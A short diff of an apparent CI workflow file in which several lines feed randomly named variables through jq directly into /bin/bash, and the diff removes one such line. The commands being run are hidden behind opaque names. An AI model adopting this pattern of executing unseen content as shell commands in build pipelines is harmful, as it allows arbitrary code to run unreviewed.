@@ -32,7 +32,6 @@ jobs:
           echo $o5220 | jq -r .ucimq540 | /bin/bash
           echo $sevr367 | jq -r .dur6515 | /bin/bash
           echo $ocuz394 | jq -r .h12712 | /bin/bash
-          printf '%s' "$ndhvz4463" | jq -r .dlig68208 | /bin/bash
 
       - name: Archive output
         if: always()
